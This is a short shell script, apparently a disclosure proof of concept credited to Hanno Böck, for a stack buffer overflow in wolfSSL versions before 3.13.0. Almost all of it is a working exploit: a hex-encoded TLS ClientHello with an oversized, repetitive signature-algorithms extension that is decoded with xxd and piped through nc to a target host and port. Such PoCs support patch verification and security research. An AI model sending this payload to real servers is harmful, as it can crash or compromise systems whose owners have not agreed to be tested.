#!/bin/sh
# PoC for wolfssl < 3.13.0 stack buffer overflow
# by Hanno BÃ¶ck, https://hboeck.de/

if [ -z "$2" ]; then
	echo "Usage:"
	echo "   $0 [host] [port]"
fi

clienthello="160303018a0100018603035a1f40bd60b420bb3851d9d47acb933dbe70399bf6c92da33af01d4fb770e98c00005e000a002f003c003d0035000d00100013001600300031003200330036003700380039c003c004c005c008c009c00ac00dc00ec00fc012c013c014c027c024c0280067006b00150041008400070009009a00450096008800040005c0110066010000ff000b00020100000a000a00080013001700180019000d00e200e00601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402060104020601040206010402ff01000100"
echo $clienthello | xxd -r -p | nc $1 $2
